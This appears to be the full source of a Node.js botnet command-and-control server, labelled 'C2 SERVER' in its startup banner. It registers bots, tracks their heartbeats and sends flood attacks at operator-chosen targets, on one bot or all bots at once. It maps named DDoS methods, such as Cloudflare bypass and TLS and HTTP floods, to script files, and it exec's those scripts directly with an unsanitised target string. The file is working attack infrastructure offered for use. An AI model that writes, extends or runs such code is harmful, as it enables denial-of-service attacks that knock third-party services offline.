const express = require('express');
const { exec } = require('child_process');
const axios = require('axios');
const fs = require('fs');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');

const app = express();
app.use(express.json());

const port = process.env.PORT || 5553;
const AUTH_TOKEN = "ricardo";

// ========== RATE LIMITING ==========
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 1000
});
app.use('/api/', limiter);

// ========== AUTH MIDDLEWARE ==========
const authenticate = (req, res, next) => {
  const token = req.headers['authorization'] || req.query.token;
  if (token !== AUTH_TOKEN) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  next();
};

// ========== DATA STORES ==========
let connectedBots = [];          // each: { id, name, url, lastSeen, attacking, attackEndTime, attacksPerformed }
let pendingCommands = {};        // botId -> command object
let stopCommands = new Set();
let blockedBots = new Set();
let attackHistory = [];

// ========== STATS ==========
let serverStats = {
  totalAttacks: 0,
  activeAttacks: 0,
  totalBots: 0,
  totalRequests: 0,
  attacksByMethod: {},
  attacksByTarget: {},
  startTime: Date.now(),
  uptime: 0
};

// ========== BOT TIMEOUT ==========
const BOT_TIMEOUT = 30000; // 30 seconds

// ========== CLEANUP INACTIVE BOTS ==========
function cleanupInactiveBots() {
  const now = Date.now();
  const before = connectedBots.length;
  connectedBots = connectedBots.filter(bot => now - bot.lastSeen < BOT_TIMEOUT);
  if (before !== connectedBots.length) {
    serverStats.totalBots = connectedBots.length;
    console.log(`[CLEANUP] Removed ${before - connectedBots.length} inactive bots`);
  }
}

// ========== UPDATE ATTACKING STATUS ==========
function updateAttackingStatus() {
  const now = Date.now();
  for (const bot of connectedBots) {
    if (bot.attacking && bot.attackEndTime && now >= bot.attackEndTime) {
      bot.attacking = false;
      bot.attackEndTime = 0;
      serverStats.activeAttacks = Math.max(0, serverStats.activeAttacks - 1);
      console.log(`[BOT] ${bot.id} finished attacking, active attacks: ${serverStats.activeAttacks}`);
    }
  }
}

// ========== PERIODIC TASKS ==========
setInterval(() => {
  cleanupInactiveBots();
  updateAttackingStatus();
  serverStats.uptime = Math.floor((Date.now() - serverStats.startTime) / 1000);
}, 5000);

// ========== METHOD FILES MAPPING ==========
const methodFiles = {
  'CF-BYPASS': 'methods/cf-bypass.js',
  'MODERN-FLOOD': 'methods/modern-flood.js',
  'HTTP-SICARIO': 'methods/REX-COSTUM.js',
  'RAW-HTTP': 'methods/h2-nust.js',
  'RAW-GET': 'methods/raw-get.js',
  'R9': 'methods/high-dstat.js',
  'PRIV-TOR': 'methods/w-flood1.js',
  'HOLD-PANEL': 'methods/http-panel.js',
  'R1': 'methods/vhold.js',
  'UAM': 'methods/uam.js',
  'W.I.L': 'methods/wil.js',
  'R10-TCP': 'methods/r10-tcp.js',
  'R10-TLS': 'methods/r10-tls.js',
  'R10-CONN': 'methods/r10-conn.js',
  'R10-HEADER': 'methods/r10-header.js',
  'R10-FRAG': 'methods/r10-frag.js',
  'R10-PIPE': 'methods/r10-pipe.js',
  'R10-COOKIE': 'methods/r10-cookie.js',
  'R10-MIXED': 'methods/r10-mixed.js',
  'R10-LOWCPU': 'methods/r10-lowcpu.js',
  'RAPID10': 'methods/r10-rapid.js',
  'BYPASS': 'methods/BYPASS.js',
  'VHOLD': 'methods/vhold.js',
  'W-FLOOD': 'methods/w-flood1.js',
  'STRESS': 'methods/curl-stress.js',
  'CURL-SPAM': 'methods/curl-stress.js'
};

// ========== BOT ENDPOINTS ==========
// Register bot with ID
app.post('/register', (req, res) => {
  const { id, name, url } = req.body;
  
  if (!id) {
    return res.status(400).json({ error: 'Bot ID required' });
  }

  if (blockedBots.has(id)) {
    console.log(`[BLOCKED] Bot tried to register: ${id}`);
    return res.status(403).json({ error: 'Bot is blocked', approved: false });
  }

  let bot = connectedBots.find(b => b.id === id);
  if (bot) {
    bot.lastSeen = Date.now();
    bot.url = url || bot.url;
    bot.name = name || bot.name;
    return res.json({ message: 'Bot already registered', approved: true, bot });
  }

  const newBot = {
    id,
    name: name || `Bot-${id.slice(-6)}`,
    url: url || `http://localhost:${Math.floor(Math.random() * 10000) + 1000}`,
    registeredAt: new Date().toISOString(),
    lastSeen: Date.now(),
    attacking: false,
    attackEndTime: 0,
    attacksPerformed: 0
  };
  
  connectedBots.push(newBot);
  serverStats.totalBots = connectedBots.length;
  console.log(`[REGISTER] New bot: ${newBot.name} (${id}) (total: ${connectedBots.length})`);
  res.json({ message: 'Bot registered successfully', approved: true, bot: newBot });
});

// Heartbeat endpoint
app.post('/heartbeat', (req, res) => {
  const { id } = req.body;
  if (!id) return res.status(400).json({ error: 'Bot ID required' });

  let bot = connectedBots.find(b => b.id === id);
  if (bot) {
    bot.lastSeen = Date.now();
    return res.json({ status: 'ok' });
  }

  if (!blockedBots.has(id)) {
    const newBot = {
      id,
      name: `Bot-${id.slice(-6)}`,
      url: 'unknown',
      registeredAt: new Date().toISOString(),
      lastSeen: Date.now(),
      attacking: false,
      attackEndTime: 0,
      attacksPerformed: 0
    };
    connectedBots.push(newBot);
    serverStats.totalBots = connectedBots.length;
    console.log(`[AUTO-REG] New bot via heartbeat: ${id}`);
    return res.json({ status: 'registered' });
  }

  res.status(403).json({ error: 'Bot is blocked' });
});

// Get command for bot
app.get('/get-command', (req, res) => {
  const { botId } = req.query;
  if (!botId) return res.status(400).json({ error: 'Bot ID required' });

  const bot = connectedBots.find(b => b.id === botId);
  if (bot) bot.lastSeen = Date.now();

  if (stopCommands.has(botId)) {
    stopCommands.delete(botId);
    return res.json({ hasCommand: true, command: { action: 'stop' } });
  }

  if (pendingCommands[botId]) {
    const command = pendingCommands[botId];
    delete pendingCommands[botId];
    console.log(`[COMMAND] Sending attack to ${botId}: ${command.methods} -> ${command.target}`);
    return res.json({ hasCommand: true, command: { action: 'attack', ...command } });
  }

  res.json({ hasCommand: false });
});

// Report endpoint
app.post('/api/report', authenticate, (req, res) => {
  const { botId, target, method, requests, duration } = req.body;

  serverStats.totalRequests += requests || 0;
  serverStats.attacksByMethod[method] = (serverStats.attacksByMethod[method] || 0) + 1;
  serverStats.attacksByTarget[target] = (serverStats.attacksByTarget[target] || 0) + 1;

  const bot = connectedBots.find(b => b.id === botId);
  if (bot) {
    bot.attacksPerformed = (bot.attacksPerformed || 0) + 1;
    bot.lastReport = Date.now();
  }

  console.log(`[REPORT] ${botId} sent ${requests || 0} requests to ${target} using ${method}`);
  res.json({ success: true });
});

// ========== CONTROL ENDPOINTS ==========
// Get all bots
app.get('/bots', authenticate, (req, res) => {
  const now = Date.now();
  const botsWithStatus = connectedBots.map(bot => ({
    id: bot.id,
    name: bot.name,
    url: bot.url,
    lastSeen: bot.lastSeen,
    attacking: bot.attacking || false,
    online: (now - bot.lastSeen) < BOT_TIMEOUT,
    attacksPerformed: bot.attacksPerformed || 0
  }));
  res.json({
    total: connectedBots.length,
    bots: botsWithStatus
  });
});

// Stats endpoint
app.get('/api/stats', authenticate, (req, res) => {
  const now = Date.now();
  const onlineBots = connectedBots.filter(b => now - b.lastSeen < BOT_TIMEOUT).length;
  res.json({
    totalAttacks: serverStats.totalAttacks,
    activeAttacks: serverStats.activeAttacks,
    totalRequests: serverStats.totalRequests,
    uptime: serverStats.uptime,
    totalBots: connectedBots.length,
    onlineBots: onlineBots,
    offlineBots: connectedBots.length - onlineBots,
    attacksByMethod: serverStats.attacksByMethod,
    attacksByTarget: serverStats.attacksByTarget
  });
});

// Stats alias
app.get('/stats', authenticate, (req, res) => {
  const now = Date.now();
  const onlineBots = connectedBots.filter(b => now - b.lastSeen < BOT_TIMEOUT).length;
  res.json({
    totalAttacks: serverStats.totalAttacks,
    activeAttacks: serverStats.activeAttacks,
    totalRequests: serverStats.totalRequests,
    uptime: serverStats.uptime,
    totalBots: connectedBots.length,
    onlineBots: onlineBots,
    offlineBots: connectedBots.length - onlineBots,
    attacksByMethod: serverStats.attacksByMethod,
    attacksByTarget: serverStats.attacksByTarget
  });
});

// Attack a specific bot
app.get('/attack-bot', authenticate, (req, res) => {
  const { bot, target, time, methods } = req.query;
  if (!bot || !target || !time || !methods) {
    return res.json({ success: false, error: 'Missing parameters: bot, target, time, methods' });
  }

  const duration = parseInt(time);
  if (isNaN(duration) || duration < 1 || duration > 3600) {
    return res.json({ success: false, error: 'Invalid time (1-3600 seconds)' });
  }

  const botObj = connectedBots.find(b => b.id === bot || b.url === bot);
  if (!botObj) {
    return res.json({ success: false, error: 'Bot not found or offline' });
  }

  // Mark bot as attacking
  botObj.attacking = true;
  botObj.attackEndTime = Date.now() + duration * 1000;

  pendingCommands[botObj.id] = {
    target: target,
    time: duration,
    methods: methods,
    timestamp: Date.now()
  };

  serverStats.totalAttacks++;
  serverStats.activeAttacks++;
  serverStats.attacksByMethod[methods] = (serverStats.attacksByMethod[methods] || 0) + 1;
  serverStats.attacksByTarget[target] = (serverStats.attacksByTarget[target] || 0) + 1;

  console.log(`[ATTACK-BOT] ${methods} -> ${target} on ${botObj.name} (${botObj.id}) for ${duration}s`);
  res.json({ success: true, message: 'Command sent to bot' });
});

// Attack all bots
app.get('/attack-all', authenticate, (req, res) => {
  const { target, time, methods } = req.query;
  if (!target || !time || !methods) {
    return res.json({ success: false, error: 'Missing parameters: target, time, methods' });
  }

  const duration = parseInt(time);
  if (isNaN(duration) || duration < 1 || duration > 3600) {
    return res.json({ success: false, error: 'Invalid time (1-3600 seconds)' });
  }

  const onlineBots = connectedBots.filter(b => Date.now() - b.lastSeen < BOT_TIMEOUT);
  
  if (onlineBots.length === 0) {
    return res.json({ success: false, error: 'No online bots available' });
  }

  let sentCount = 0;
  for (const bot of onlineBots) {
    bot.attacking = true;
    bot.attackEndTime = Date.now() + duration * 1000;
    pendingCommands[bot.id] = {
      target: target,
      time: duration,
      methods: methods,
      timestamp: Date.now()
    };
    sentCount++;
  }

  serverStats.totalAttacks += sentCount;
  serverStats.activeAttacks += sentCount;
  serverStats.attacksByMethod[methods] = (serverStats.attacksByMethod[methods] || 0) + sentCount;
  serverStats.attacksByTarget[target] = (serverStats.attacksByTarget[target] || 0) + sentCount;

  console.log(`[ATTACK-ALL] ${methods} -> ${target} on ${sentCount} bots for ${duration}s`);
  res.json({ success: true, message: `Attack sent to ${sentCount} bots` });
});

// Stop all attacks
app.get('/stop-all', authenticate, (req, res) => {
  pendingCommands = {};
  for (const bot of connectedBots) {
    stopCommands.add(bot.id);
    bot.attacking = false;
    bot.attackEndTime = 0;
  }
  serverStats.activeAttacks = 0;
  console.log(`[STOP-ALL] Stopped all attacks on ${connectedBots.length} bots`);
  res.json({ success: true, message: `Stop command sent to ${connectedBots.length} bots` });
});

// Block a bot
app.get('/block-bot', authenticate, (req, res) => {
  const { bot } = req.query;
  if (!bot) return res.json({ success: false, error: 'Bot ID required' });
  blockedBots.add(bot);
  connectedBots = connectedBots.filter(b => b.id !== bot);
  delete pendingCommands[bot];
  stopCommands.delete(bot);
  serverStats.totalBots = connectedBots.length;
  res.json({ success: true, message: 'Bot blocked' });
});

// Unblock a bot
app.get('/unblock-bot', authenticate, (req, res) => {
  const { bot } = req.query;
  if (!bot) return res.json({ success: false, error: 'Bot ID required' });
  blockedBots.delete(bot);
  res.json({ success: true, message: 'Bot unblocked' });
});

// Get blocked bots
app.get('/blocked', authenticate, (req, res) => {
  res.json({ blocked: Array.from(blockedBots) });
});

// Remove a bot
app.get('/remove-bot', authenticate, (req, res) => {
  const { bot } = req.query;
  if (!bot) return res.json({ success: false, error: 'Bot ID required' });
  const before = connectedBots.length;
  connectedBots = connectedBots.filter(b => b.id !== bot);
  delete pendingCommands[bot];
  stopCommands.delete(bot);
  serverStats.totalBots = connectedBots.length;
  res.json({ success: true, message: 'Bot removed', removed: before !== connectedBots.length });
});

// ========== SERVER-SIDE DIRECT ATTACK ==========
app.get('/attack', authenticate, (req, res) => {
  const { target, time, methods } = req.query;
  if (!target || !time || !methods) {
    return res.status(400).json({ error: 'Missing parameters' });
  }
  const duration = parseInt(time);
  if (isNaN(duration) || duration < 1 || duration > 3600) {
    return res.status(400).json({ error: 'Invalid time' });
  }
  const methodFile = methodFiles[methods];
  if (!methodFile || !fs.existsSync(methodFile)) {
    return res.status(400).json({ error: `Method not found: ${methods}` });
  }

  console.log(`[SERVER-ATTACK] ${methods} -> ${target} for ${duration}s`);
  attackHistory.push({ target, time: duration, method: methods, timestamp: Date.now() });
  serverStats.totalAttacks++;
  serverStats.activeAttacks++;
  serverStats.attacksByMethod[methods] = (serverStats.attacksByMethod[methods] || 0) + 1;
  serverStats.attacksByTarget[target] = (serverStats.attacksByTarget[target] || 0) + 1;

  const cmd = `node ${methodFile} ${target} ${duration}`;
  exec(cmd, (error, stdout, stderr) => {
    if (error) {
      console.error(`[ERROR] ${error.message}`);
    } else {
      if (stdout) console.log(`[OUTPUT] ${stdout.substring(0, 200)}`);
    }
    serverStats.activeAttacks = Math.max(0, serverStats.activeAttacks - 1);
  });

  res.json({ success: true, message: 'Server attack launched', target, time: duration, methods });
});

// ========== UTILITY ENDPOINTS ==========
app.get('/methods', authenticate, (req, res) => {
  const available = Object.keys(methodFiles).filter(name => fs.existsSync(methodFiles[name]));
  res.json({ methods: available, total: available.length });
});

app.get('/ping', (req, res) => {
  res.json({ 
    alive: true, 
    timestamp: Date.now(), 
    bots: connectedBots.length,
    uptime: serverStats.uptime
  });
});

app.get('/health', (req, res) => {
  res.json({ 
    status: 'healthy', 
    bots: connectedBots.length,
    uptime: serverStats.uptime
  });
});

app.get('/history', authenticate, (req, res) => {
  res.json({ attacks: attackHistory.slice(-50) });
});

app.get('/clear-all', authenticate, (req, res) => {
  const secret = req.query.secret;
  if (secret !== 'CLEAR_ALL_BOTS') return res.status(401).json({ error: 'Invalid secret' });
  connectedBots = [];
  pendingCommands = {};
  stopCommands.clear();
  attackHistory = [];
  serverStats.activeAttacks = 0;
  serverStats.totalAttacks = 0;
  serverStats.totalRequests = 0;
  serverStats.attacksByMethod = {};
  serverStats.attacksByTarget = {};
  res.json({ success: true, message: 'All data cleared' });
});

// ========== ERROR HANDLER ==========
app.use((err, req, res, next) => {
  console.error('[ERROR]', err.message);
  res.status(500).json({ error: 'Internal server error' });
});

// ========== START SERVER ==========
app.listen(port, () => {
  console.log('\n========================================');
  console.log('🔥 C2 SERVER READY');
  console.log('========================================');
  console.log(`📍 Port: ${port}`);
  console.log(`🔑 Auth Token: ${AUTH_TOKEN}`);
  console.log('📊 Bot Registration: ID-based');
  console.log('📡 Endpoints:');
  console.log('  - POST /register (bot registration)');
  console.log('  - GET /bots (list bots)');
  console.log('  - GET /api/stats (stats)');
  console.log('  - GET /attack-bot (attack single bot)');
  console.log('  - GET /attack-all (attack all bots)');
  console.log('  - GET /stop-all (stop all attacks)');
  console.log('========================================\n');

  if (!fs.existsSync('./methods')) {
    fs.mkdirSync('./methods');
    console.log('[SETUP] Created methods directory');
  }
  if (!fs.existsSync('./proxy.txt')) {
    fs.writeFileSync('./proxy.txt', '# Proxies (ip:port)\n');
    console.log('[SETUP] Created proxy.txt');
  }
});
